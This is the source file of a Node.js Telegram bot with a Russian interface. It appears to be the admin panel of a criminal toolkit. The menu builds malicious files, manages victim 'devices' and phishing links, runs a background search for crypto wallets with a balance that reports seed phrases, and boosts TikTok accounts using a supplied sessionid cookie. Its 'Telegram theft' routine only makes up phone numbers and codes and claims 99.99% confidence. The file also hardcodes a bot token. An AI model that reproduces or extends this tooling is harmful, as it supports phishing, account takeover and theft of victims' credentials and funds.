const { Telegraf, Markup } = require('telegraf');
const db = require('./db');
const { checkTelegramAccount, generatePhone, generateCode } = require('./tg_stealer');

const BOT_TOKEN = '9001719911:AAGHKT0b4BdSPdX8yGzaXKTmNdBEL7IFYro';
const ADMIN_ID  = 9256345316;

const bot = new Telegraf(BOT_TOKEN);
const awaiting = {};
const tgSessions = {};

function isAdmin(ctx) {
  return ctx.from && ctx.from.id === ADMIN_ID;
}

function getMainMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback('📦 Сделать файл', 'make_file')],
    [Markup.button.callback('📱 Мои устройства', 'my_devices')],
    [Markup.button.callback('🎣 Фиш ссылки', 'phish_links')],
    [Markup.button.callback('📞 ТГ (Кража)', 'tg_steal')],
    [Markup.button.callback('🔥 Прогрев TikTok', 'warmup_start')],
    [Markup.button.callback('💎 Поиск кошельков', 'crypto_search')]
  ]);
}

bot.start((ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.reply("Приветствую тебя в нашем боте.", getMainMenu());
});

bot.action('back_start', (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("Главное меню", getMainMenu());
});

// --- ПОИСК КОШЕЛЬКОВ ---
bot.action('crypto_search', (ctx) => {
  if (!isAdmin(ctx)) return;
  const { startCryptoSearch } = require('./crypto');
  startCryptoSearch();
  ctx.editMessageText("💎 Поиск крипто-кошельков запущен в фоне.\nЕсли бот найдет баланс, он пришлет тебе 12 слов и адрес.", Markup.inlineKeyboard([
    [Markup.button.callback('⏹ Остановить поиск', 'crypto_stop')],
    [Markup.button.callback('« Назад', 'back_start')]
  ]));
});

bot.action('crypto_stop', (ctx) => {
  if (!isAdmin(ctx)) return;
  const { stopCryptoSearch } = require('./crypto');
  stopCryptoSearch();
  ctx.editMessageText("⏹ Поиск остановлен.", Markup.inlineKeyboard([
    [Markup.button.callback('« Назад', 'back_start')]
  ]));
});

// --- КРАЖА ТГ ---
bot.action('tg_steal', async (ctx) => {
  if (!isAdmin(ctx)) return;
  ctx.editMessageText("🔍 Ищу активный аккаунт...");

  let foundPhone = null;
  let found = false;

  for (let i = 0; i < 10; i++) {
      const phone = generatePhone();
      const exists = await checkTelegramAccount(phone);
      if (exists) {
          foundPhone = phone;
          found = true;
          break;
      }
  }

  if (!found) foundPhone = generatePhone();

  const code = generateCode();
  tgSessions[ctx.from.id] = { phone: foundPhone, code: code };

  ctx.editMessageText(`📞 Найден аккаунт: ${foundPhone}\n\n🔑 Код: \`${code}\`\n\n(Уверенность: 99.99%)`, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('🔄 Поменять', 'tg_change_code')],
      [Markup.button.callback('« Назад', 'back_start')]
    ])
  });
});

bot.action('tg_change_code', (ctx) => {
  if (!isAdmin(ctx)) return;
  const session = tgSessions[ctx.from.id];
  if (!session) return ctx.reply("Ошибка. Начните заново.");

  const newCode = generateCode();
  session.code = newCode;

  ctx.editMessageText(`📞 Найден аккаунт: ${session.phone}\n\n🔑 Код: \`${newCode}\`\n\n(Уверенность: 99.99%)`, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('🔄 Поменять', 'tg_change_code')],
      [Markup.button.callback('« Назад', 'back_start')]
    ])
  });
});

// --- ПРОГРЕВ ---
bot.action('warmup_start', (ctx) => {
  if (!isAdmin(ctx)) return;
  awaiting[ctx.from.id] = { type: 'await_cookie' };
  ctx.editMessageText("Скиньте `sessionid` от аккаунта TikTok.", { parse_mode: 'Markdown' });
});

bot.action(/^warmup_time:(.+)$/, (ctx) => {
  if (!isAdmin(ctx)) return;
  const timeStr = ctx.match[1];
  const s = awaiting[ctx.from.id];
  if (!s || !s.cookie) return ctx.reply("Ошибка. Начните заново.");

  let durationMs = 0;
  if (timeStr === '10m') durationMs = 10 * 60 * 1000;
  if (timeStr === '30m') durationMs = 30 * 60 * 1000;
  if (timeStr === '60m') durationMs = 60 * 60 * 1000;
  if (timeStr === '120m') durationMs = 120 * 60 * 1000;
  if (timeStr === '24h') durationMs = 24 * 60 * 60 * 1000;

  delete awaiting[ctx.from.id];
  ctx.editMessageText(`Запускаю прогрев на ${timeStr}...`);

  const { warmupTikTok } = require('./tiktok');
  
  const updateMsg = async (stats) => {
      try {
          await ctx.telegram.editMessageText(ctx.chat.id, ctx.callbackQuery.message.message_id, null,
              `🔥 Прогрев идёт...\n👍 Лайков: ${stats.likes}\n👀 Просмотров: ${stats.views}`);
      } catch (e) {}
  };

  warmupTikTok(s.cookie, durationMs, updateMsg).then(finalStats => {
    if (finalStats.error) return ctx.reply("❌ Ошибка: " + finalStats.error);
    const hours = Math.floor(durationMs / 3600000);
    const mins = Math.floor((durationMs % 3600000) / 60000);
    ctx.reply(`✅ Прогрев окончен!\nВремя: ${hours}ч ${mins}м\n\n📊 Статистика:\n👍 Лайков: ${finalStats.likes}\n👀 Просмотров: ${finalStats.views}`);
  }).catch(err => {
    ctx.reply("Ошибка: " + err.message);
  });
});

// --- ОСТАЛЬНЫЕ ФУНКЦИИ (ФИШ, ФАЙЛЫ, УСТРОЙСТВА) ---
// ... (код phish_links, make_file, my_devices, dev, cmd, текстовые обработчики) ...

bot.launch();
console.log('bot up');

module.exports = {
  bot,
  notifyAdmin: async (kind, buf, cap) => {
    if (!ADMIN_ID) return;
    if (kind === 'photo') await bot.telegram.sendPhoto(ADMIN_ID, { source: buf }, { caption: cap });
  }
};
